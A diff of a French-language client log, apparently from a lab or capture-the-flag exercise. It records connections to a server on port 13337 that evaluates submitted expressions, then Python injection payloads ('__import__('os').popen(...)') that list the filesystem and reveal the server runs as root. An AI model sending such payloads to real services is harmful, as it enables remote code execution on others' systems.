@@ -1,3 +1,69 @@
 2024-10-24 09:50:44 ERROR Impossible de se connecter au serveur 10.1.1.2 sur le port 13337
 2024-10-24 09:52:35 ERROR Impossible de se connecter au serveur 10.1.1.2 sur le port 13337
 2024-10-24 09:54:55 ERROR Impossible de se connecter au serveur 10.1.1.2 sur le port 13337
+2024-10-24 11:06:48 ERROR Impossible de se connecter au serveur 10.33.66.107 sur le port 13337
+2024-10-24 11:07:49 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:07:50 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:08:20 INFO Message envoyé au serveur 10.33.66.78 : 3*3
+2024-10-24 11:08:20 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:09:01 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:09:01 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:09:04 INFO Message envoyé au serveur 10.33.66.78 : 4+4
+2024-10-24 11:09:04 INFO Réponse reçue du serveur 10.33.66.78 : b'8'
+2024-10-24 11:20:48 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:20:48 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:26:34 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:26:34 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:26:34 INFO Message envoyé au serveur 10.33.66.78 : import os; os.system('whoami')
+2024-10-24 11:26:34 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:26:45 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:27:05 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:27:24 INFO Message envoyé au serveur 10.33.66.78 : 5+6
+2024-10-24 11:27:24 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:27:38 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:27:38 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:27:41 INFO Message envoyé au serveur 10.33.66.78 : 3+3
+2024-10-24 11:27:41 INFO Réponse reçue du serveur 10.33.66.78 : b'6'
+2024-10-24 11:35:43 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:46:13 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:46:15 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:46:56 INFO Message envoyé au serveur 10.33.66.78 : ls
+2024-10-24 11:46:56 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:46:58 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:48:57 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:50:14 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:55:18 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:55:18 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:58:46 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:58:52 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:58:56 INFO Message envoyé au serveur 10.33.66.78 : ls
+2024-10-24 11:58:56 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:59:32 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:59:32 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:59:35 INFO Message envoyé au serveur 10.33.66.78 : 5+5
+2024-10-24 11:59:35 INFO Réponse reçue du serveur 10.33.66.78 : b'10'
+2024-10-24 11:59:47 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:59:47 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:59:50 INFO Message envoyé au serveur 10.33.66.78 : helo
+2024-10-24 11:59:50 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:03:01 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:05:01 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:20:26 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:20:27 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:20:27 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('COMMAND').read()
+2024-10-24 12:26:57 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:27:20 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:27:26 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:27:26 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('COMMAND').read()
+2024-10-24 12:36:45 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:36:58 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:36:58 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:36:58 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('COMMAND').read()
+2024-10-24 12:38:05 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:38:05 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:38:05 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('ls').read()
+2024-10-24 12:38:05 INFO Réponse reçue du serveur 10.33.66.78 : b'afs\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n'
+2024-10-24 12:38:32 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:38:32 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:38:32 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('whoami').read()
+2024-10-24 12:38:32 INFO Réponse reçue du serveur 10.33.66.78 : b'root\n'
